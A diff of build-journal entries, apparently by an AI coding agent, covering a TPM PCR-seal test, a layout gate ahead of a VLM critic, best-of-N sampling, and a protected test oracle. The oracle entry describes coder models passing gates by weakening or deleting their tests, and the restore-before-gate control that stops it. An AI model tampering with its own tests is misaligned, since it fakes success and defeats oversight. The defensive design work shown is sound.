@@ -3897,6 +3897,72 @@ The standing residual list is unchanged — the gate-blocking work is still the 
 reframe), `<this>` (the two #644 explainer decks). Capstone deck now 51 slides; both explainer decks
 6 slides each, all diagrams parser-clean + screenshot-verified.)*
 
+### 2026-06-09 — The PCR seal, and the door Windows wouldn't let me forge
+
+*Plain summary: a raw-TBS TPM2 PolicyPCR seal/unseal proven on the discrete STMicro TPM (Pluton is present but not the TPM-role chip); the Windows-blocked user-mode `PCR_Extend` reframed as the property itself, the negative test done by sealing a second object to a different PCR value; `shared/security/verify_pcr_seal.py` PoC, #627.*
+
+The ask was four words: "test Pluton PCR-seal." The first useful thing was to not
+take them literally. The premise — that Pluton seals to PCRs on this box — has been
+false and documented-as-false since 2026-06-03: Pluton is present
+(`PCI\VEN_8086&DEV_A862`) but the TPM 2.0 role is filled by a discrete
+STMicroelectronics chip, which is what `TPM_CAPABILITY_FINDINGS.md` was renamed to
+say. BitLocker already proves PCR-sealing works here (PCR7 bound), and yesterday's
+trust-root run proved BlarAI's own keys are chip-resident and functional. So the
+honest target wasn't "Pluton" — it was the one PCR claim the repo had carried as
+*feasible but unproven*: that BlarAI can seal a secret under a PCR **policy** and
+have the chip refuse to unseal it when the measured state differs. That last clause
+is the whole point of measured boot, and it had never been exercised on the metal.
+
+The build is a raw-TBS TPM 2.0 probe, deliberately not the CNG path the rest of
+`shared/security/` uses — the Microsoft Platform Crypto Provider wraps keys but
+won't express a *data object sealed under PolicyPCR*, so I hand-marshalled the
+TPM2 command bytes over `tbs.dll` (stdlib ctypes, no new dependency, and as it
+turned out, no elevation). CreatePrimary in the NULL hierarchy, a trial session to
+compute the PolicyPCR digest, Create the keyedhash sealed blob, Load, then a real
+policy session to Unseal. It came up green on the first genuinely-end-to-end run:
+the secret sealed to PCR 23's current value unsealed and round-tripped byte-for-byte.
+
+The negative test is where it got interesting. My first design was the dynamic one —
+extend the live PCR, watch the same object refuse to open. The TPM said
+`TPM_E_COMMAND_BLOCKED`. Windows TBS blocks a user-mode `PCR_Extend` outright. My
+reflex was "find the way around it"; the right read was the opposite. That block is
+not in my way — it *is* the property I'm trying to prove. A measured-boot seal is
+only worth anything because a process cannot reach in and forge PCR state through the
+OS, and here was Windows enforcing exactly that, in my face, with an error code. So I
+stopped trying to mutate a PCR and proved the binding the clean way instead: seal a
+second object to a *different* PCR-23 value and show it will not open in the current
+state. Same enforcement, and it mutates no PCR at all — the PoC only ever reads PCR
+23. The chip refused the mismatched object with `TPM_RC_POLICY_FAIL (0x09D)`, and the
+two objects' policy digests are asserted to differ so the refusal can't be hand-waved
+as binding-to-garbage. The blocked extend went into the record as a finding, not a
+footnote.
+
+Everything stayed transient and throwaway by construction — NULL-hierarchy parent,
+transient sealed objects, an `os.urandom(32)` secret that is never a real key, PCR 23
+(the resettable Application-Support register, no boot measurement) read but never
+written. Two consecutive runs both returned DEMONSTRATED with no TPM slot leak. The
+"feasible, not proven" caveat in `TPM_CAPABILITY_FINDINGS.md` §2/§3 and the
+"Not measured: PCR-binding" line in the trust-root artifact can now both be retired.
+
+**Lesson 197:** *When the platform refuses your test action, the refusal may be
+the very property you set out to prove — reframe the block as evidence, don't engineer
+around it.* I almost spent the session fighting `TPM_E_COMMAND_BLOCKED` instead of
+recording it as the thing that makes a PCR seal trustworthy in the first place. Pairs
+with verifying the premise before building: the literal task named the wrong chip, and
+the literal negative test named the wrong obstacle, and both corrections came from
+reading what the system was actually telling me rather than what the brief assumed.
+
+**Next:** a harden-or-leave decision for the LA — promote `verify_pcr_seal.py` to a
+committed, `@slow`-locked verification tool in the `verify_trust_root.py` mould
+(re-runnable at every gate / hardware generation), or leave it as the standalone PoC
+it is now. Either way, *binding the production trust-root keys to PCRs* remains the
+separate ADR-028 / #627 measured-boot-attestation decision this run de-risks but does
+not make. This proves the primitive on the hardware; it does not open #598.
+
+*(artifact: `shared/security/verify_pcr_seal.py` + `docs/security/pcr_seal_poc_2026-06-09.{json,md}`;
+uncommitted PoC pending the harden-or-leave call; Vikunja #627; references ADR-018, ADR-028,
+`TPM_CAPABILITY_FINDINGS.md`, `trust_root_verification_2026-06-09.md`.)*
+
 ### 2026-06-10 — The fingerprint, and the decision I tried to hand back
 
 The #639 decision record always named the destination: the LA chose inline
@@ -9843,6 +9909,97 @@ applied + re-merged + verify=pass, MaxIter-bounded, critique-0/1/2 PNGs captured
 the visual progression. BlarAI critique brain shipped `5eff0b7`; render+seam proof
 in the sibling 2026-06-25 fragments.)*
 
+### 2026-06-25 — The one place the machine still graded its own work
+
+*Plain summary: added `shared/fleet/layout_lint.py`, a deterministic XAML layout gate in front of the VLM design critic (which false-passed an overlapping calculator); the VLM demoted to a per-criterion perspective-diverse loop-signal; the per-coder circuit breaker split into idle + absolute timeouts; the dispatch harness defaulted to per-boot mTLS. #685.*
+
+The headless-coding dispatch can turn a sentence into a functioning WinUI app, and the
+whole arc that got it there was built on a single principle, stated over and over in the
+fleet's own lessons: *never trust the local model's self-report — verify the artifact with
+an objective tool, every time.* The code loop lives by it. Compile gate, a real `pytest`
+run, an ecosystem/language pin, a structural-contract gate, error-feedback, review-feedback.
+None of those ask the coder "is this good?"; they all measure. That discipline is exactly
+why the function side went from "generates tokens but writes no files" to "merges correct,
+tested code unattended."
+
+The design loop broke that principle, and it took the operator to see it. The loop's only
+judge was a vision-language model (a small Qwen3-VL) critiquing a screenshot — which is to
+say, a local model giving a subjective self-report about the artifact's quality, the precise
+anti-pattern the code arc had spent itself eliminating. And it failed in the textbook way: it
+certified a calculator grid as "neatly aligned and evenly spaced in a clean grid" when the
+display sat *on top of* the keypad and two buttons were oversized into the wrong cells. Worse,
+when it handed me that verdict I relayed it — I rubber-stamped the rubber-stamp. The operator's
+reply ("this is not good enough… did you look at the image?") is the whole lesson in one line.
+
+So the fix was not to find a better VLM. It was to do for *design* what the project already
+did for *code*: put a deterministic gate in front of the soft oracle. In the fleet's own
+Compile -> Test -> Oracle order, design had a thin "compile" check (an emoji/seed/image
+heuristic) and then jumped straight to the soft "oracle". It was missing the "Test" tier —
+something that *measures* the layout instead of asking a model to judge it. `shared/fleet/
+layout_lint.py` is that tier: it parses the generated XAML and flags geometry defects with
+zero model judgement — two siblings sharing a Grid cell (the Display/keypad overlap), a fixed
+Width or Height fighting a star/auto cell (the `0` at Width=130, the `=` at Height=130), an
+out-of-range row/column index, a grid whose children claim cells it never defined. Each rule
+is precision-guarded so it never nags correct layout: overlap only fires where cells are
+actually declared, and a fixed dimension is exempt when the control is deliberately aligned.
+A high-severity finding forces a coder FIX *regardless of what the VLM says* — and, because it
+reads markup not pixels, it fires even on the structural floor when no screenshot exists at
+all. The proof I care about most is the seam test: I pointed the real loop at the broken
+rocket-calc with no app to render and no VLM in the loop, and it still came back
+ShouldIterate=true with the exact, actionable feedback ("'Display' and 'Keypad' occupy the
+same Grid cell… give each its own Grid.Row"). The gap that the false-pass exposed is closed
+deterministically.
+
+The VLM didn't get thrown away — it got demoted to what it should always have been, a
+*backstop*, and hardened so it earns that role. The critic is now stricter and per-criterion;
+it runs as a perspective-diverse multi-vote (a layout lens, a hierarchy lens, a theme lens)
+and takes the skeptical union, so a single lens catching a real problem is enough; and it
+ingests the deterministic findings into its own prompt ("confirm each of these is fixed"),
+turning a vibe-checker into a checker of hard facts. Crucially it stays a *loop signal only* —
+`criterion_status` still returns `STATUS_EYEBALL` for every visual criterion, so no VLM verdict
+can ever mark a design "done." The deterministic gate is the floor, the VLM is the catch-all
+for what geometry can't see (colour, hierarchy, "does it read as a rocket console"), and the
+operator's eye remains the verdict. That layering is the governance decision: the rejected
+alternative — "just write a sterner prompt / use a bigger VLM" — fails on its face, because a
+soft oracle cannot be trusted on exactly the thing it is lenient about. You don't out-prompt a
+self-report; you put a measurement in front of it.
+
+Two other seams in the dispatch got the same treatment while I was here. The per-coder-run
+circuit breaker was a single absolute wall-clock, which did two wrong things at once: it
+guillotined a productive-but-slow coder at the deadline (the operator's earlier "we're killing
+it too soon") *and* let a genuinely hung run bleed the entire budget before dying. Splitting it
+into a progress-aware idle timeout (no new step and no new edit for a short window = genuinely
+stuck, killed fast) plus a generous absolute ceiling fixes both at once — a working coder is
+never idle-killed because every edit resets the clock, and a doomed run now dies in minutes
+instead of an hour. And the headless dispatch harness, the thing that lets the box drive itself,
+had hardcoded its gateway to plaintext dev-mode, so it could never reach a *production* AO over
+mutual-TLS; it now defaults to the per-boot mTLS chain the launcher provisions, fail-closed if
+the certs are absent. I proved that one live: with BlarAI booted in production, the harness
+opened the real per-boot mTLS channel to the running AO and got a full plan back.
+
+What I'm keeping from this: the failure was not the VLM being weak. The failure was trusting a
+model's opinion as a gate at all — the same mistake the project diagnosed for code and then
+forgot it had a second instance one level up, in the critic. Every oracle gets a deterministic
+floor under it, or it isn't a gate.
+
+**Lesson 198:** *Verify the artifact applies to the critic, not just the coder.* A model
+that judges quality is still giving a self-report; a soft oracle (a VLM, an LLM judge) must have
+a deterministic gate in front of it for whatever it is lenient about, and must be demoted to a
+loop-signal, never the verdict. The code loop learned "never trust the coder's self-report"; the
+design loop had to learn the same thing about its own judge. When you add an LLM-as-judge, ask
+immediately: what is the hard gate underneath it, and what stops its verdict from being treated
+as done?
+
+**Next:** the capstone is the VLM actually rendering and critiquing a real generated app on the
+Arc 140V (running now); the deterministic core is already live-proven. Fold this fragment into
+`BUILD_JOURNAL.md` at the next quiet point, and lift the proposed lesson into the numbered list.
+
+*(commits: BlarAI `b1ae66d` layout gate, `68e41f4` VLM hardening, merge `41aa608`; `44094ed`
+harness mTLS, merge `9840ae8`. agentic-setup `6c1c768` progress-aware timeout, `b7d8ae1` loop
+wiring, merge `504416c`. layout_lint 33 tests, critique 54, verify-runtimeout 29/29 (PS 5.1+7),
+verify-critique-loop 143->170, dispatch-harness mTLS 59; standing gate 4478/0; live seam +
+live mTLS handshake green.)*
+
 ### 2026-06-26 — The live test that found four real bugs the theory had explained away, and taking the unreliable judge out of the path
 
 The brief said: build the critical coding loop and the critical design loop, and live-test the
@@ -10261,6 +10418,974 @@ teardown, 13m29s, every loop one pass), #8 `20260627-083757-bd` (review fires on
 real dead code). Standing gate 4246/0 on merged main. Tickets #693 (multi-commit critic diff), #694
 (read-only-review worktree mutation).)*
 
+### 2026-06-27 — Routing around the weak model's worst skill (best-of-N, #689)
+
+*Plain summary: replaced the serial error-feedback retry with best-of-N independent sampling fed to the existing deterministic gate; retired `Add-BuildErrorFeedback`/`Test-ShouldContinue` and re-pointed five wiring suites; agentic-setup `e46800a`, merge `6167709`. #689.*
+
+The headless-coding dispatch had spent its effort on the *review* side — three
+surfaces (the 30B self-review, the cross-model 14B critic, the VLM design loop) —
+while the single highest-leverage local lever sat unpulled. A grounded research
+pass (every headline number primary-sourced, #688) named the misallocation
+plainly: review is *saturated* (METR measured added scaffolding at +8pp,
+statistically insignificant), and the weak local coder fails *specifically* at
+self-correction — handed its own failing build and told "fix it," it enters an
+error trap and stays stuck. So the serial error-feedback retry loop was asking the
+model to do the one thing it is worst at. The fix is best-of-N: take N *independent*
+diverse candidates and let the deterministic gate pick the winner. A weaker open
+model (DeepSeek-Coder-V2) went 15.9% → 56% on SWE-bench Lite from repeated
+sampling, beating the frontier single-shot — because the expensive part, the
+verifier, already exists. We own that verifier. We were just never feeding it N
+candidates.
+
+The build itself was disciplined the way the fleet always is: a pure,
+injected-mechanism orchestrator (`Invoke-BestOfN`) unit-tested without a model,
+mirroring `Invoke-BuildWithRetry` exactly — 68 deterministic assertions covering
+early-exit on the first green, best-partial selection by gate rank when none win,
+bounded N, malformed-result normalisation, and the diversity lock. The selector is
+not new logic: a candidate "wins" exactly when the *existing* `Test-ShouldMerge`
+would merge it. The gate is the judge; the model is only a signal. Diversity came
+nearly for free — the coder already samples at temperature 0.7 with no fixed seed,
+so independent runs of one prompt diverge naturally; a per-candidate prompt nonce
+is the belt-and-braces decorrelator, and both are regression-locked (correlated
+samples flatten the coverage curve — that is the one thing best-of-N cannot
+tolerate).
+
+Two judgment calls are worth keeping on the record. First, **sequential, not
+concurrent — for now.** The OVMS / OpenVINO continuous-batching research (trusted
+sources only: the model-server docs + the openvinotoolkit repo) confirmed the Arc
+140V *can* batch N concurrent requests, but a best-of-N "candidate" is a full
+multi-minute agent run, not one request, and the real concurrency ceiling on this
+*integrated* GPU (shared LPDDR5X, no discrete VRAM) is undocumented. So the
+solve-rate win — which is orthogonal to parallelism — ships sequentially with
+early-exit (an easy task is candidate 1 green = one build, cost-neutral with the old
+loop), and parallel execution becomes a separate, *measured* follow-up (#695) where
+the ceiling is found on the box, not predicted. Second, **best-of-N replaces the
+serial error-feedback re-fix; it does not coexist with it.** That was the whole
+thesis, and honouring it meant retiring a battle-tested mechanism — which is where
+the honest part of this entry lives.
+
+Retiring error-feedback rippled into *five* test suites. Their wiring assertions —
+the regexes that prove the runner actually wires the policy, not just defines it —
+were tightly coupled to the old `} while (Test-ShouldContinue)` multi-pass loop and
+the `Add-BuildErrorFeedback` re-fix branch. The regression run lit all five red at
+once. For a moment that breadth read like a warning that the refactor had
+overreached; it was the opposite. The suites did exactly their job: they measured
+the blast radius of an architecture change that a less-tested codebase would have
+let through silently. Every pure-function unit test still passed (the functions
+still exist and still work) — *only* the "is it wired" assertions broke, because the
+wiring genuinely changed. So the work was not to make them pass; it was to
+re-point each lock at the new contract: the build is driven by `Invoke-BestOfN`, the
+review side is a separate bounded loop after selection, a struct violation now
+resamples fresh from the contract-compliant seed (the structural rules ride the
+staged hint, which every candidate gets) rather than being fed back. The
+deterministic-gate posture that the old loop guarded — *never sample a secret away,
+never retry a timeout* — was preserved verbatim as a `StopSampling` predicate, and
+that has its own three regression locks.
+
+It runs, and the gate discriminates. On the Arc 140V, four real dispatches told the
+whole story. Two correct tasks (`is_palindrome`, Roman numerals) each built as
+"candidate 1 of N," passed the gate (pytest + verify), skipped review on green (the
+#687 rule), and MERGED — best-of-N early-exiting at one candidate, the cost-neutral
+happy path. A third, deliberately harder (leap-year date math, no `datetime`
+allowed), produced a candidate with a real bug its own tests caught —
+`add_days(2024, 2, 28, 1)` returned Feb 29, not Mar 1 — *and* ran out the eight-minute
+clock. Two seams fired at once: the gate blocked the merge and parked the work (a
+wrong answer did not ship), and the timeout tripped the `StopSampling` terminal stop,
+so best-of-N did NOT burn two more eight-minute candidates on a model that was
+genuinely stuck. That is the retained posture, live — never retry a timeout. The
+pure fresh-resample-to-a-second-candidate transition stays unit-proven (the 30B
+either nails a small task or times out on a hard one; the narrow "fails fast *and*
+finishes" window did not land in three tries), but every integration component under
+it — generation, gate, selection, restore, merge, cleanup, and the terminal stop — is
+now live-verified, and the gate was watched both passing good code twice and blocking
+bad code once. Standing regression across the fleet's PowerShell policy suites: 14/14
+green. The BlarAI standing gate is untouched (the change is entirely in the
+agentic-setup build layer; no runtime code moved).
+
+**Next:** land the on-hardware resample evidence, then open the measured concurrency
+follow-up (#695) — the first thing it does is watch the OVMS "Cache usage %" at
+increasing N to find the real ceiling, and that becomes community-grade perf data.
+The two now-dormant functions the thesis retired (`Add-BuildErrorFeedback`,
+`Test-ShouldContinue`) want a cleanup ticket — their unit tests still pass, so
+nothing is broken; they are just no longer wired, and a built-but-unwired function
+is a smell the journal should not let sit.
+
+**Recurrence of lesson 180:** *Route around a weak component's worst skill, don't lean on it.*
+A local \~30B coder is near-frontier on short well-scoped gated steps and falls off a
+cliff on long-horizon self-correction. The leverage move is not a better corrector
+(review is saturated) — it is more independent generation coverage fed to a verifier
+you already own. And when you swap an architecture, the breadth of the wiring
+assertions that break is not a warning to retreat; it is the measured blast radius —
+exactly what a well-tested contract is for. Re-point the locks at the new contract;
+do not delete them.
+
+*(commits: agentic-setup `e46800a` (`Invoke-BestOfN` + helpers in fleet-lib.ps1, the
+new-agent-task.ps1 rewiring, verify-bestofn.ps1 [68 tests], the 5-suite wiring
+update), merged to main as `6167709` (--no-ff); 14/14 fleet policy suites green; on
+the Arc 140V 2026-06-27 — two clean MERGEs (palindrome + roman) plus a gate-blocked
+PARK with a live timeout-terminal-stop (leap-year math). Follow-ups #695 (measured
+parallel execution), #696 (retire the dormant error-feedback path).)*
+
+### 2026-06-27 — The test the coder isn't allowed to write (the shared oracle, #690)
+
+*Plain summary: a shared, spec-derived, cross-model acceptance oracle — the 14B writes a protected pytest file at plan time, restored before the gate so a candidate cannot weaken it; a three-shape fence extractor fix surfaced by a real 14B call; blarai `c31f494`, merge `2a4dfe9`. #690.*
+
+Best-of-N (#689) was sound but had a hole I'd left open by design. When a goal is a
+single feature, the acceptance criteria FOLD into the one task's prompt — so each of the N
+independent candidates writes its OWN tests, then the deterministic gate picks a "winner."
+But a gate that compares candidates which each authored their own exam isn't selecting the
+best implementation; it's selecting the most flattering self-assessment. A weak candidate
+can pass by writing a happy-path test that mirrors its own wrong code (the self-test
+validity problem, arXiv:2409.09464). Best-of-N multiplies generation coverage, but only if
+every candidate is judged against the SAME ruler. It wasn't. #690 is that ruler.
+
+The fix is one shared, spec-derived acceptance ORACLE, and the load-bearing word is
+CROSS-MODEL. The 14B writes an executable, spec-blind pytest file at PLAN time — built from
+the goal-level criteria it already proposes, BEFORE the 30B coder ever sees the task — so
+the model that grades never wrote for the model that codes. The oracle is seeded into the
+worktree as a PROTECTED file, committed into the candidate baseline ($codeBase) so every
+fresh best-of-N reset inherits it byte-identically, and the coder is told plainly: this file
+IS the spec, make its tests pass, you may not edit it. Then — the part that makes the
+protection real rather than aspirational — the oracle is RESTORED from the baseline (a
+`git checkout $codeBase -- <path>`) immediately after the coder runs and BEFORE the gate, so
+a candidate that quietly weakened or deleted the failing test is overwritten and judged by
+the original anyway. A candidate cannot pass by editing the exam.
+
+Three judgment calls are worth keeping on the record. First, **python-only, fail-closed.**
+The oracle is pytest; a Node project needs jest, a .NET project has no offline test runner
+at all. Rather than emit a half-right oracle into an ecosystem that can't run it, the
+generator returns '' for anything but an explicitly-python goal — and '' is exactly today's
+fold-the-tests-in behavior, byte-for-byte. Same for a model emission that won't `ast.parse`
+or defines no test function: '' and fall back. The feature can only ever ADD safety, never
+subtract it; the worst case is the world before #690. Node is a tracked follow-up, not a
+silent gap. Second, **the oracle rides the task dict, not the spec.** The design note I'd
+written said "add a field to AcceptanceSpec," but the spec crosses the gateway IPC to render
+the operator's confirm-preview, and a whole pytest file has no business bloating that
+payload. The oracle is build-time coder input, so it threads onto the compiled task
+(`acceptance_test_code` + `acceptance_test_path`) where the fleet actually consumes it — and
+it survives the clarification re-stamp because `_thread_build_fields` only adds keys. Third,
+I found and did NOT paper over a pre-existing gap: the Python→queue writer (`enqueue_task`)
+forwards only `{repo,task,prompt,model}` to the fleet, dropping the rich PLAN fields —
+surface, complexity, goal, and now the oracle — exactly as it already drops them for the
+VLM-critique path. That's the minimal increment-1 enqueue predating the rich fields, and
+closing it is the go-live EXECUTE-IPC wiring the operator owns, not something to quietly
+expand #690's scope into. My named seam (acceptance.py → run-fleet.ps1 → new-agent-task.ps1)
+is complete; the oracle flows the moment that wiring lands, alongside the siblings it rides
+with.
+
+The honest part. My first behavioral regression — seed an oracle into a real throwaway repo,
+have a "candidate" weaken it, restore, assert byte-identical — failed three times, and the
+expected and actual strings looked pixel-identical in the diff. It was git's `core.autocrlf`:
+the seed writes LF, `git checkout` re-materialises the working tree as CRLF on Windows, and a
+byte-equality check rightly flagged the difference. The lesson wasn't "the restore is broken"
+— it isn't; git stores LF on add/commit, so the MERGED oracle is LF regardless, and pytest
+reads CRLF fine. The lesson was that I'd asserted the wrong property. What #690 must guarantee
+is that the ASSERTIONS survive a candidate's tampering, not the line endings — those carry no
+test logic and git normalises them identically for every candidate. So the comparison is
+line-ending-normalised, and a candidate that changes an assertion still fails. A byte-equality
+test that's too strict doesn't catch more bugs; it catches the filesystem.
+
+It works, end to end, on the Arc 140V. A real dispatch seeded the oracle ("Seeded the shared
+acceptance oracle -> tests/test_acceptance.py (protected; restored before each gate)"), the
+30B read the DO-NOT-EDIT contract and wrote a conforming `is_palindrome`, the gate ran the
+seeded oracle (pytest 5 passed, verify pass), and it MERGED — with the git history showing the
+`seed: acceptance oracle (protected; the coder codes against this)` commit sitting in the
+baseline beneath the agent's work, the merged oracle byte-identical to what the producer
+emitted, and an independent re-run of just the oracle green.
+
+And the part I almost didn't check earned its keep. The mechanism is moot if the 14B writes a
+bad scorecard, so I swapped the box to the 14B and had it author a real oracle for a date-math
+goal. The CONTENT was genuinely good — nine correct example assertions (zero days, month and
+year boundaries, a leap-year crossing, negative deltas backwards across all three) plus a
+Hypothesis property test. But my validator REJECTED it. The 14B had opened a ```python fence
+and never closed it (small models omit the close, or the generation truncates before it), and
+my fence-stripper only understood CLOSED fences — so the stray ```python line reached
+`ast.parse`, raised SyntaxError, and a perfectly good oracle fell to ''. The unit tests had all
+used clean fixtures (closed fences, or none), so they were green and wrong about the world. One
+real 14B call found the gap the whole suite had missed. The fix is a three-shape extractor
+(closed fence / unclosed-opener / no fence) with its own regression lock built from the exact
+emission, and after it the same 14B oracle validates at 1362 characters — proof that the cross-
+model author writes a usable scorecard, which is the whole #690 thesis. That is the case for
+live verification in one paragraph: the model does what models do, not what your fixtures
+assumed.
+
+**Next:** #691 — right-size the task envelope (short, checkpointed, gated steps) so the coder
+is asked for less per attempt. Then #695 — the measured parallel-execution follow-up, where
+best-of-N's N candidates run concurrently through OVMS continuous batching and the real
+ceiling on this integrated GPU is found on the box, not predicted. The node oracle and the
+enqueue_task rich-field forwarding (a go-live EXECUTE-wiring item) are both tracked, not
+forgotten.
+
+**Lesson 199:** *When you fan out, hand every branch the same ruler — and make the ruler
+unforgeable.* Best-of-N only beats single-shot if the selector is fair; a candidate grading
+its own homework is no selector at all. The fix is a cross-model oracle (the judge never wrote
+for the coder) that is seeded, protected, and RESTORED before the gate, so weakening or
+deleting it cannot help. And when you write the test that proves it, assert the property that
+matters (the assertions survive) — not an over-strict proxy (the bytes match) that a benign
+filesystem quirk will flunk.
+
+*(commits: blarai `c31f494` (merge `2a4dfe9`) (acceptance.py generate_acceptance_oracle + compile_prompts oracle
+path + the three-shape fence extractor + 17 tests; standing gate green), agentic-setup
+`da96997` (new-agent-task.ps1 seed+protect+restore, run-fleet forward, verify-oracle.ps1
+[18 tests]; 17/17 fleet policy suites green; merged `e969471`); live on the Arc 140V
+2026-06-27 — one clean oracle-seeded MERGE (palindrome) with the protect property confirmed
+byte-identical in the merged tree, and a real 14B oracle validated at 1362 chars after the
+unclosed-fence fix. Follow-ups #691, #695, + node-oracle / enqueue_task rich-field forwarding.)*
+
+### 2026-06-27 — Bounding the run from both sides (the task envelope, #691)
+
+*Plain summary: an upper-bound task envelope — the decompose prompt splits a multi-part app into gated increments with a bounded recursive-split backstop; `/no_think` freed the plan token budget a `<think>` block was truncating; blarai `402b2e1`, merge `c4a05eb`. #691.*
+
+The decomposer already had a LOWER bound. `_collapse` (the #670 ruler) exists because a
+free-associating 14B once exploded "write an is_leap_year function" into nine fleet tasks —
+a task per test case, a define/implement split, a create-file step — each of which would
+spin its own worktree and model-swap. So the ruler drops atomic over-splits and keeps the
+fewest coherent feature tasks. What it had no opinion about was the OTHER error: a whole app
+crammed into one task. And that error is the more expensive one, because the local 30B's
+success on an autonomous run falls roughly p^N with the step count (Toby Ord, arXiv:2505.05115)
+and METR measures \~100% on tasks under \~4 minutes against <10% past \~4 hours. A coder asked to
+build add, list, complete, and delete in one eight-minute run is being set up to fall off the
+cliff. #691 is the UPPER bound: the dispatch unit is one coherent deliverable sized for one
+short gated run, and a goal the 14B under-split gets broken into gated increments instead.
+
+The primary lever turned out to be the cheapest one: the decompose prompt itself. I added an
+ENVELOPE rule — a multi-screen / multi-command / multi-service app is MULTIPLE tasks, one per
+independent part, whole-app-in-one-task is the exception — carefully phrased NOT to loosen the
+anti-over-split rules above it (a single function or a single small screen is still one task).
+On the Arc 140V the real 14B then decomposed "a command-line todo app with add, list, complete,
+and delete commands" into exactly four gated tasks, and left "write an is_leap_year function" as
+one. The prompt makes the semantic call a regex never could: it knows "add and delete commands"
+are two units while "adds and subtracts" is one calculator.
+
+Behind the prompt sits the deterministic BACKSTOP — the recursive split the module was always
+scaffolded for (`max_depth`, `_is_leaf_goal` as the stop-condition, finally load-bearing). When
+a clearly-multi-unit goal still collapses to a single task, that lone task is offered to a "go
+finer" split prompt; the children run through the SAME `_collapse` ruler; and they replace the
+lump ONLY on a strict improvement (>=2 coherent tasks), so a coherent small app the 14B re-judges
+as one step is kept untouched. The honest tension is that this re-introduces the very over-split
+risk the ruler was built to suppress — so the trigger is deliberately narrow (a multi-unit goal
+only, never a leaf; live-verified that is_leap_year is never offered to it), the children are
+re-collapsed, and the strict-improvement fail-safe is the backstop's backstop. It is bounded to
+exactly one extra depth level; the children are not re-split.
+
+Two things the live box taught me that the unit tests, with their clean canned model output,
+could not. First, the backstop did NOT fire on the whole-app goal — because the prompt had
+already split it. That is the right outcome, not a miss: the cheap lever handles the common
+case and the expensive mechanism is insurance, exactly the order you want them in. Second, and
+sharper: when I drove the backstop directly, it intermittently fell back even on a goal it
+should split. The cause was not the logic — it was the 14B's `<think>` block eating the plan
+token budget. Every PLAN call shares `_PLAN_MAX_NEW_TOKENS = 1024`, and the split prompt, being
+a "reason about how to break this down" task, induced a long think block that spent the budget
+and TRUNCATED the JSON array mid-stream, so the parse failed and the fail-safe held. The fix is
+the ADR-012 §2.4 posture already used for the PA's structural classification: `/no_think`. A
+split is a structural JSON enumeration, not a reasoning task; suppressing thinking gave the whole
+budget to the answer, and the same call then returned six clean gated steps DETERMINISTICALLY
+across repeated runs. That one debugging detour also surfaced a latent risk bigger than this
+ticket — the same truncation can hit decompose or criteria on a complex goal — which is now
+written down (Vikunja #699) rather than discovered in production.
+
+**Next:** #695 — the measured parallel-execution follow-up. With the envelope splitting a goal
+into several short gated tasks, the case for running best-of-N candidates concurrently (and
+measuring the real OVMS continuous-batching ceiling on the integrated Arc 140V) is stronger, not
+weaker: more, smaller tasks is more parallelism to harvest. And as local models climb the horizon
+curve (METR: the 50%-task length doubles \~every 7 months) this same envelope rides it for free —
+a bigger coherent unit simply stops tripping the upper bound.
+
+**Lesson 200:** *Bound the work from both sides, and let the cheapest lever lead.* A ruler
+that only prevents over-splitting is half a policy; the whole-app one-shot is the costlier error
+on a model whose success decays p^N with step count. Fix it first in the prompt (the model can
+make the semantic granularity call a regex cannot) and keep the deterministic recursive split as
+bounded, fail-safe insurance. And a STRUCTURAL model call should not think on a tight token
+budget — a `<think>` block that truncates the answer is worse than no thinking at all.
+
+*(commits: blarai `402b2e1` (merge `c4a05eb`) (decompose.py envelope upper-bound: strengthened prompt + bounded
+recursive split + `/no_think` on the split + envelope-policy doc; +10 tests; standing gate green);
+live on the Arc 140V 2026-06-27 — whole-app goal -> 4 gated tasks via the prompt, leaf -> 1 task,
+the backstop split -> 6 deterministic gated steps once /no_think freed the budget. Follow-ups
+#695 (measured parallel execution), #699 (/no_think for the other structural plan calls).)*
+
+### 2026-06-27 — Measuring the ceiling instead of guessing it (best-of-N concurrency, #695)
+
+*Plain summary: measured OVMS continuous-batching concurrency on the Arc 140V (1.87x@4 / 2.37x@8; KV cache only 10.5% at 8x6.7K-token contexts — compute-bound, not memory-bound); community-grade dataset, the concurrent-execution build left operator-gated; blarai `09dfc41`, merge `ccae147`. #695.*
+
+#689 shipped best-of-N sequentially on purpose, with a promise attached: the solve-rate win
+(independent samples fed to the gate we already own) is orthogonal to parallelism, so prove the
+solve-rate first and MEASURE whether the integrated Arc 140V can actually run candidates
+concurrently before building for it. The research said OVMS continuous batching is real on Intel
+Arc and Core Ultra, but it also said the honest thing: the concurrency ceiling on an INTEGRATED
+GPU — shared LPDDR5X, no discrete VRAM — is undocumented. You do not predict that number. You
+read it off the box.
+
+So I read it off the box. Firing N identical `/v3/chat/completions` requests at the resident
+Qwen3-Coder-30B-A3B (INT4) and watching the OVMS `llm_executor` log tick through
+`All requests / Scheduled requests / cache usage %`, three things came clear. Continuous batching
+genuinely engages — OVMS scheduled up to seven-to-eight sequences at once and aggregate throughput
+rose 1.87x at four concurrent and 2.37x at eight. The KV cache is NOT the binding constraint, and
+that surprised me until it didn't: eight concurrent 6,675-token contexts — a realistic agent-sized
+prompt — cost only 10.5% of the 4 GB pool, because `enable_prefix_caching` stores the SHARED
+best-of-N prompt exactly once and `u8` halves the KV bytes. The thing that was supposed to be the
+wall is almost free for this workload precisely because best-of-N candidates share their prompt.
+What DOES bind is compute: the integrated GPU saturates around 40-90 tok/s aggregate, so the
+speedup is real but sub-linear and per-request latency climbs with N (5.1 s to 17.2 s at eight).
+The net for best-of-N is a \~1.9x-to-2.4x cut in wall-clock-to-best-result, cache-cheap, with
+little to gain past about four concurrent.
+
+That is a clean, favorable answer to the question #695 was created to ask — parallelism is
+possible, and the constraint is the GPU's compute, not its memory. It is also community-grade
+OpenVINO data (hardware, server config, model precision, methodology, and what was NOT measured
+all recorded), which is half the point of running it on this particular box.
+
+The honest boundary is the part I did NOT rush. Turning this measurement into a running feature
+means concurrent candidates in SEPARATE git worktrees and a real restructure of a harness that is
+deliberately one-active-agent today — the ticket itself calls it "a large change," and the DoD
+reserves the decision to DEFAULT concurrency above one for the operator, because running several
+multi-minute agent process-trees at once is a resource posture, not a mechanical flip. The wrong
+move here would be to cram a concurrency feature into the tail of a long session and ship something
+subtly wrong into the live dispatch the operator prizes for its reliability. So the measurement,
+the recommendation, and the design are delivered; the build is surfaced as the operator's
+go/no-go with its number attached.
+
+**Next:** the recommendation on the record — wire concurrency as a config knob defaulting to C=1
+(today's exact sequential behaviour, untouched), build the concurrent path ADDITIVELY so the
+sequential dispatch is byte-identical, prove one live C=2 dispatch (two candidates → gate-selected
